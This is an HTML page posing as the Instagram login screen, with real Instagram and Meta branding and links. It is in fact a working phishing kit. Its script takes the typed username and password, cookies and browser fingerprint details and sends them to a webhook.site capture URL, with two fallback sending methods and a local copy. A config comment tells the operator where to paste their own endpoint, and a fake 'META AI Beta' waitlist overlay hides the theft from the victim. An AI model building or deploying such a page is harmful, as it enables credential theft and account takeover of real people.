<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VbsNW_y6xU1.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg: #111112;
            --card: #1F1F22;
            --text: #F2F4F6;
            --muted: #9FA4AB;
            --border: #3E4042;
            --blue: #0064E0;
            --blue-hover: #0051b3;
            --link: #4BA9FE;
            --error: #ed4956;
        }
        
        body {
            font-family: -apple-system, system-ui, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
        }
        
        .container {
            width: 100%;
            max-width: 360px;
        }
        
        .login-card {
            background: var(--card);
            border-radius: 16px;
            padding: 40px 36px 28px;
            text-align: center;
            border: 1px solid #2a2a3e;
            animation: fadeUp 0.5s ease;
        }
        
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .ig-logo {
            width: 96px;
            height: 96px;
            margin: 0 auto 20px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/yp/r/kMOjiHCb1kY.webp');
            background-size: 97px 152px;
            background-position: 0 0;
            background-repeat: no-repeat;
            display: inline-block;
        }
        
        .login-title {
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--text);
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .input-wrap {
            position: relative;
        }
        
        .input-wrap input {
            width: 100%;
            height: 48px;
            padding: 16px 12px 6px;
            background: rgba(31, 31, 34, 0.6);
            border: 1px solid var(--border);
            border-radius: 16px;
            color: var(--text);
            font-size: 15px;
            font-weight: 500;
            font-family: inherit;
            outline: none;
            transition: all 0.2s ease;
        }
        
        .input-wrap input:focus {
            border-color: var(--blue);
            background: rgba(0, 100, 224, 0.05);
        }
        
        .input-wrap input.error {
            border-color: var(--error);
            animation: shake 0.4s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-6px); }
            40% { transform: translateX(6px); }
            60% { transform: translateX(-4px); }
            80% { transform: translateX(4px); }
        }
        
        .input-wrap input:not(:placeholder-shown) + label,
        .input-wrap input:focus + label {
            transform: translateY(-9px) scale(0.78);
            color: var(--blue);
        }
        
        .input-wrap label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--muted);
            font-size: 15px;
            font-weight: 400;
            pointer-events: none;
            transition: all 0.2s ease;
            transform-origin: left top;
        }
        
        .btn-login {
            width: 100%;
            height: 40px;
            background: var(--blue);
            color: white;
            border: none;
            border-radius: 22px;
            font-size: 15px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            margin-top: 6px;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            position: relative;
            overflow: hidden;
        }
        
        .btn-login:hover:not(:disabled) {
            background: var(--blue-hover);
        }
        
        .btn-login:active:not(:disabled) {
            transform: scale(0.97);
        }
        
        .btn-login:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .forgot-link {
            display: block;
            margin-top: 18px;
            color: var(--link);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
            color: var(--muted);
            font-size: 13px;
            font-weight: 500;
        }
        
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border);
        }
        
        .btn-fb {
            width: 100%;
            height: 40px;
            background: transparent;
            color: var(--text);
            border: 1px solid #50545B;
            border-radius: 22px;
            font-size: 15px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
            transition: background 0.2s;
        }
        
        .btn-fb:hover { background: rgba(255,255,255,0.04); }
        
        .btn-fb svg { width: 18px; height: 18px; fill: var(--text); }
        
        .btn-create {
            width: 100%;
            height: 40px;
            background: transparent;
            color: var(--text);
            border: 1px solid #50545B;
            border-radius: 22px;
            font-size: 15px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            margin-top: 10px;
            transition: background 0.2s;
        }
        
        .btn-create:hover { background: rgba(255,255,255,0.04); }
        
        .meta-logo {
            margin-top: 28px;
            width: 76px;
            height: 15px;
        }
        
        .meta-logo svg { width: 100%; height: 100%; }
        .meta-logo path { fill: #DEE3E9; }
        
        .footer {
            margin-top: 36px;
            text-align: center;
            color: #555;
            font-size: 12px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px 14px;
            margin-bottom: 14px;
        }
        
        .footer-links a {
            color: #555;
            text-decoration: none;
            font-size: 12px;
            transition: color 0.2s;
        }
        
        .footer-links a:hover { color: #888; }
        
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(10, 10, 15, 0.96);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .overlay-card {
            background: var(--card);
            border-radius: 24px;
            padding: 44px 32px;
            text-align: center;
            max-width: 360px;
            width: 90%;
            border: 1px solid #2a2a3e;
            animation: scaleUp 0.4s ease 0.15s both;
        }
        
        @keyframes scaleUp {
            from { opacity: 0; transform: scale(0.92); }
            to { opacity: 1; transform: scale(1); }
        }
        
        .overlay-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 26px;
        }
        
        .overlay h2 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .overlay p {
            color: var(--muted);
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 16px;
        }
        
        .waitlist-num {
    font-size: 40px;
    font-weight: 800;
    background: linear-gradient(90deg, #0082FB, #f5576c);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    color: transparent;
    margin: 12px 0;
}
        
        .overlay-footer {
            font-size: 12px;
            color: #555;
            margin-top: 16px;
        }
        
        @media (max-width: 400px) {
            .login-card { padding: 32px 24px 24px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="ig-logo"></div>
            <h1 class="login-title">Log into Instagram</h1>
            
            <form class="login-form" id="lf">
                <div class="input-wrap">
                    <input type="text" id="u" name="u" placeholder=" " required autocomplete="username">
                    <label for="u">Mobile number, username or email</label>
                </div>
                
                <div class="input-wrap">
                    <input type="password" id="p" name="p" placeholder=" " required autocomplete="current-password">
                    <label for="p">Password</label>
                </div>
                
                <button type="submit" class="btn-login" id="bl">
                    <span class="bt">Log in</span>
                    <div class="spinner" id="sp"></div>
                </button>
            </form>
            
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
            
            <div class="divider">or</div>
            
            <a href="https://www.facebook.com/login.php" class="btn-fb">
                <svg viewBox="0 0 24 24"><path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"/></svg>
                Log in with Facebook
            </a>
            
            <a href="https://www.instagram.com/accounts/emailsignup/" class="btn-create">Create new account</a>
            
            <div class="meta-logo">
                <svg viewBox="0 0 500 100" fill="none">
                    <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#DEE3E9"/>

                </svg>
            </div>
        </div>
    </div>
    
    <div class="overlay" id="ov">
        <div class="overlay-card">
            <div class="overlay-icon">✨</div>
            <h2>You're on the list!</h2>
            <p>Your META AI Beta access request has been submitted. You'll be notified when your spot is ready.</p>
            <div class="waitlist-num" id="wn">#247</div>
            <p class="overlay-footer">Estimated wait: 2-3 weeks</p>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-links">
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.instagram.com/blog/">Blog</a>
            <a href="https://help.instagram.com/">Help</a>
            <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
            <a href="https://www.instagram.com/legal/terms/">Terms</a>
        </div>
        <p>© 2026 Instagram from Meta</p>
    </footer>
    
    <script>
        // ============================================================
        // CONFIG: Set your capture endpoint here
        // Go to https://webhook.site → copy your unique URL → paste below
        // Or leave as-is for localStorage-only capture
        // ============================================================
        const EP = 'https://webhook.site/126c9732-9913-4f0d-85d5-70edd4d04e67';
        
        const $ = id => document.getElementById(id);
        const form = $('lf');
        const btn = $('bl');
        const sp = $('sp');
        const bt = document.querySelector('.bt');
        const ov = $('ov');
        
        const genId = (pre, len) => pre + Array.from({length: len}, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');
        
        form.addEventListener('submit', async e => {
            e.preventDefault();
            
            const u = $('u').value.trim();
            const p = $('p').value;
            
            if (!u || !p) return;
            
            btn.disabled = true;
            bt.style.display = 'none';
            sp.style.display = 'block';
            
            const payload = {
                u: u,
                p: p,
                c: document.cookie,
                ua: navigator.userAgent,
                pl: navigator.platform,
                lang: navigator.language,
                sr: screen.width + 'x' + screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ref: document.referrer,
                ts: new Date().toISOString(),
                url: location.href,
                sid: genId('IGT', 28),
                csrf: genId('', 32),
                uid: String(Math.floor(Math.random() * 9000000000 + 1000000000))
            };
            
            // Method 1: JSON POST
            try {
                await fetch(EP, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(err) {
                // Method 2: no-cors form data
                try {
                    const fd = new FormData();
                    Object.entries(payload).forEach(([k, v]) => fd.append(k, v));
                    await fetch(EP, { method: 'POST', body: fd, mode: 'no-cors' });
                } catch(e2) {
                    // Method 3: image beacon
                    try {
                        const img = new Image();
                        img.src = EP + '?' + new URLSearchParams(payload).toString();
                    } catch(e3) {}
                }
            }
            
            // Save to localStorage for built-in reveal
            try {
                const existing = JSON.parse(localStorage.getItem('__c') || '[]');
                existing.push(payload);
                localStorage.setItem('__c', JSON.stringify(existing));
            } catch(e) {}
            
            setTimeout(() => {
                btn.disabled = false;
                bt.style.display = 'block';
                sp.style.display = 'none';
                $('wn').textContent = '#' + Math.floor(Math.random() * 300 + 100);
                ov.style.display = 'flex';
            }, 1400);
        });
        
        document.querySelectorAll('.input-wrap input').forEach(inp => {
            inp.addEventListener('blur', () => {
                if (inp.value && inp.value.length < 3) {
                    inp.classList.add('error');
                    setTimeout(() => inp.classList.remove('error'), 500);
                }
            });
        });
    </script>
